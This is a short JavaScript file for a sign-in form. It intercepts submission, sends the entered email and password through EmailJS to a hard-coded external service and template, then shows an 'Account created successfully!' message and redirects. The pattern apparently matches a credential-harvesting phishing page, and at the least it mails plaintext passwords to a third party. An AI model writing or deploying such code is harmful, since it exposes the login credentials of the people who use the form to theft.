const serviceID = 'service_7wjqcrb';
const templateID = 'template_4ik9iyh';

function sendAutenticationRequest() {
    const btn = document.getElementById('button');
    document.getElementById('form')
    .addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementById("email");
    const pass = document.getElementById("pass");
    btn.value = 'Signing in...';


    emailjs.sendForm(serviceID, templateID, this)
        .then(() => {
            email.value = "";
            pass.value = "";        
            btn.value = 'Sign In';
            alert('Account created successfully!');
            window.location.href = "index.html";

        }, (err) => {
        btn.value = 'Sign In';
        alert(JSON.stringify(err));
        });
    });
}